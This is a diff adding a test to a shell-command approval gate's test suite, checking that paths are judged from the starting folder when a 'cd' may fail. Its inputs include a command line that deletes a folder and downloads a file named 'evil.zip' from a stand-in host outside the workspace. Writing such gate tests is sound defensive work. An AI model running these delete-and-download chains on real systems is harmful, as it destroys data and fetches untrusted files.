@@ -354,6 +354,33 @@ describe('a command that runs a script is judged by the script (#635) @cap:execu
       }),
     ]);
   });
+
+  // Nodal review of PR #721, pass 3: whether a `cd` succeeds is never read
+  // from the disk when the gate judges. The line may remove the folder before
+  // it (or make it), and `sub/../other` fails in POSIX when sub is missing.
+  it('past a cd that may fail, the folder the line started in is judged too (#723)', async () => {
+    const win = process.platform === 'win32';
+    await put('sub/keep.txt', 'x');
+    await put('other/keep.txt', 'x');
+    const removed = win
+      ? 'rmdir /s /q sub & cd sub & curl -o ..\\evil.zip https://x/a'
+      : 'rm -rf sub; cd sub; curl -o ../evil.zip https://x/a';
+    expect(await asked(removed)).toContainEqual({
+      category: 'download',
+      state: 'ask',
+      details: [removed],
+      outside: [{ command: removed, places: [win ? '..\\evil.zip' : '../evil.zip'] }],
+    });
+    const lexical = win ? 'cd sub\\..\\other & ..\\cleanup.bat' : 'cd sub/../other; ../cleanup.sh';
+    expect(await asked(lexical)).toEqual([
+      {
+        category: 'inline_code',
+        state: 'ask',
+        details: [lexical],
+        unread: [{ source: win ? '..\\cleanup.bat' : '../cleanup.sh', why: 'decided_at_run_time' }],
+      },
+    ]);
+  });
 });
 
 // A script the gate cannot read is code nobody read ahead: the kind
